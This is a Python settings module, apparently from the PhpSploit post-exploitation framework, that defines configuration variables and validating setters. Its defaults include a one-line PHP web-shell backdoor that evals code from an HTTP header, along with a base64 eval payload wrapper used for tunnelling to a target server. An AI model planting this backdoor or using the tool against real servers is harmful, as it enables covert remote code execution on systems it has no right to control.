import os, sys, re, random, tempfile, webbrowser
from datatypes import *
from ui.color import colorize, decolorize


class SettingVar:
    """SettingVar instances are ever used as Settings() variables
    declaration.
    It provides multilines buffers, that picks a random choice, and
    dynamic binding from external file paths.

    It takes one required argument, which is the variable's value.

    The second argument (optionnal) takes a variable setter function,
    that raizes an exception if the value can't be set, and returns
    the formatted object otherwise. This argument defaults to
    a function that returns the value as it is, and does nothing more.

    __str__() provides a nice colored string representation of the
        variable's object.

    __call__() picks a random choice (if multiple), and returns the
        object itself, or it's call if callable.

    __iadd__() adds an awesome behavior: using var+="string" acts adding
        "string" into the var's buffer, considering it as a new possible
        choice.

    """
    def __init__(self, value, setfunc=(lambda x:x)):
        value = str(value)
        self._getobj = setfunc

        if value[7:] and value[:7].lower() == "file://":
            self.file = os.path.truepath(value[7:])
            try: self.buffer = open(self.file, "r").read()
            except: raise ValueError("not a readable file: «%s»" %self.file)
        else:
            self.file = None
            self.buffer = value

        # if single choice, make sure choice is valid, trying to pass
        # choice to _getobj, which may return an exception if it fails
        if len(self.buffer.splitlines()) == 1:
            self._getobj(self.buffer.splitlines()[0])

        # if multi choice, at least one line must be usable
        elif not self.choices():
            raise ValueError("couldn't find valid lines from buffer")


    def __call__(self):
        """Return a random object picked from choices.
        If callable, `obj()` is returned instead of `obj`

        """
        obj = random.choice( self.choices() )
        if hasattr(obj, "__call__"):
            return obj()
        return obj


    def __str__(self):
        """Return a color string representation of the setting var object.
        If the buffer has no multiple lines, single choice's string
        representation is returned. Otherwise, the multi line choices
        buffer is represented.

        >>> str( SettingVar("singleChoice") )
        'singleChoice'
        >>> str( SettingVar("file:///etc/passwd") )
        '<RandLine@/etc/passwd (24 choices)>'
        >>> str( SettingVar("choice1\\nchoice2") )
        '<RandLine (2 choices)>'

        """
        # if buffer have one line only, return line string's obj repr
        if not self.file and len( self.buffer.splitlines() ) == 1:
            return str( self._getobj(self.buffer.strip()) )

        # else, return multi choice buffer representation
        string = colorize("%BoldBlack", "<", "%BoldBlue",
                          "RandLine", "%BasicCyan")
        if self.file:
            string += colorize("@", "%Bold", self.file)
        string += colorize("%BasicBlue")

        choices = len( self.choices() )
        string += " (%s choice%s)" %(choices, ('','s')[choices>1])
        string += colorize("%BoldBlack", ">")

        return decolorize(string)
        return string


    def __iadd__(self, new):
        """
        >>> x = SettingVar("choice1")
        >>> x += "choice2"
        >>> x += "file:///tmp/foo"
        >>> str(x)
        '<RandLine@/tmp/foo (2 choices)>'

        """
        # only strings must be added
        if not isinstance(new, str):
            msg = "Can't convert '{}' object to str implicitly"
            raise TypeError( msg.format(type(new).__name__) )

        new += os.linesep
        lines = len(new.splitlines())

        # adding file:// line changes obj's parent file
        if lines == 1 and new[7:] and new[:7] == "file://":
            result = SettingVar(self.buffer, self._getobj)
            result.file = new[7:].strip()
            return result

        # other strings are added to the buffer, and parent file
        # is set to None (because buffer is no more a copy of a file)
        if self.buffer[-1] not in "\r\n":
            self.buffer += os.linesep
        self.buffer += new
        return SettingVar(self.buffer, self._getobj)


    def update(self):
        """Try to replace current buffer from parent file (self.file)
        content. If file path is unavailable or None, or no file's
        lines are valid choices, the buffer is not changed.

        """
        try:
            buffer = open(self.file, 'r').read()
            assert self.choices(buffer)
            self.buffer = buffer
        except:
            pass


    def choices(self, buffer=None):
        """Return `buffer` string's usable choices list. Each choice
        is an object returned by _getobj() method. _getobj() fails,
        empty lines, and lines starting with '#' are ignored.

        If None (default), self.buffer is used as buffer.

        """
        # use self.buffer as default buffer
        if buffer is None:
            self.update()
            buffer = self.buffer
        # assert buffer is a string
        elif not isinstance(buffer, str):
            raise ValueError("RandLine.choices(x): must be string or None")

        # return a list of valid choices only
        result = []
        for line in buffer.splitlines():
            line = line.strip()
            if line and not line.startswith('#'):
                try: result.append( self._getobj(line) )
                except: continue
        return result



class Settings:

    def __init__(self):
        # Dirs
        self.TMPPATH  = tempfile.gettempdir()
        self.SAVEPATH = tempfile.gettempdir()

        # Tunnel link opener
        self.TARGET   = None
        self.BACKDOOR = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
        self.PROXY    = None
        self.PASSKEY  = "phpSpl01t"

        # System tools
        self.TEXTEDITOR = "%%DEFAULT%%"
        self.WEBBROWSER = "%%DEFAULT%%"

        # HTTP Headers
        self.HTTP_USER_AGENT = "file://framework/misc/http_user_agents.lst"

        # HTTP Requests settings
        self.REQ_DEFAULT_METHOD  = "GET"
        self.REQ_HEADER_PAYLOAD  = "eval(base64_decode(%%BASE64%%))"
        self.REQ_INTERVAL        = "1-10"
        self.REQ_MAX_HEADERS     = 100
        self.REQ_MAX_HEADER_SIZE = "4 KiB"
        self.REQ_MAX_POST_SIZE   = "4 MiB"
        self.REQ_ZLIB_TRY_LIMIT  = "20 MiB"
        pass


    def __getattribute__(self, name):

        value = object.__getattribute__(self, name)
        #print(type(value))
        return value


    def __setattr__(self, name, value):
        # if the set value is a SettingVar obj, just do it!
        if hasattr(value, '_getobj'):
            return object.__setattr__(self, name, value)

        basename = name

        # format name and value
        name = name.upper().replace('-', '_')
        value = str(value)

        # use setting's dedicated setter
        if name[5:] and name[:5] == "HTTP_":
            setter = self._set_HTTP_header
        else:
            try:
                setter = getattr(self, '_set_'+name)
            except AttributeError:
                msg = "'{}' object attribute '{}' is read-only"
                msg = msg.format(self.__class__.__name__, basename)
                raise AttributeError(msg)
        value = SettingVar(value, setter)
        object.__setattr__(self, name, value)


    def _set_HTTP_header(self, value):
        return str(value)

    def _set_REQ_INTERVAL(self, value):
        return Interval(value)

    def _set_TMPPATH(self, value):
        if value == "%%DEFAULT%%":
            value = tempfile.gettempdir()
        return Path(value, mode="drw")

    def _set_SAVEPATH(self, value):
        if value == "%%DEFAULT%%":
            value = tempfile.gettempdir()
        return Path(value, mode="drw")

    def _set_TARGET(self, value):
        if value.lower() in ["", "none"]:
            return None
        return Url(value)

    def _set_BACKDOOR(self, value):
        if not value.find("%%PASSKEY%%"):
            raise ValueError("shall contain %%PASSKEY%% string")
        return PhpCode(value)

    def _set_PROXY(self, value):
        if value.lower() in ["", "none"]:
            return None
        return Proxy(value)

    def _set_PASSKEY(self, value):
        value = value.lower()
        reserved_headers = ['host','accept-encoding','connection',
                            'user-agent','content-type','content-length']
        if not value:
            raise ValueError("can't be an empty string")
        if not re.match("^[a-zA-Z0-9_]+$", value):
            raise ValueError("only chars from set «a-Z0-9_» are allowed")
        if re.match('^zz[a-z]{2}$', value) \
        or value.replace('_','-') in reserved_headers:
            raise ValueError("reserved header name: «{}»".format(value))
        return value

    def _set_TEXTEDITOR(self, value):
        if value == "%%DEFAULT%%":
            value = "vi"
            if "EDITOR" in os.environ:
                value = os.environ["EDITOR"]
            elif sys.platform.startswith("win"):
                value = "notepad.exe"
        return Executable(value)

    def _set_WEBBROWSER(self, value):
        if value == "%%DEFAULT%%":
            value = webbrowser.get().name
        return Executable(value)

    def _set_REQ_DEFAULT_METHOD(self, value):
        if value.upper() not in ["GET", "POST"]:
            raise ValueError("available methods: GET/POST")
        return value.upper()

    def _set_REQ_HEADER_PAYLOAD(self, value):
        return PhpCode(value)

    def _set_REQ_INTERVAL(self, value):
        return Interval(value)

    def _set_REQ_MAX_HEADERS(self, value):
        if 10 <= int(value) <= 680:
            return int(value)
        raise ValueError("must be an integer from 10 to 680")

    def _set_REQ_MAX_HEADER_SIZE(self, value):
        value = ByteSize(value)
        if 250 > value:
            raise ValueError("can't be less than 250 bytes")
        return value

    def _set_REQ_MAX_POST_SIZE(self, value):
        value = ByteSize(value)
        if 250 > value:
            raise ValueError("can't be less than 250 bytes")
        return value

    def _set_REQ_ZLIB_TRY_LIMIT(self, value):
        value = ByteSize(value)
        if value < 1:
            raise ValueError("must be a positive bytes number")
        return value
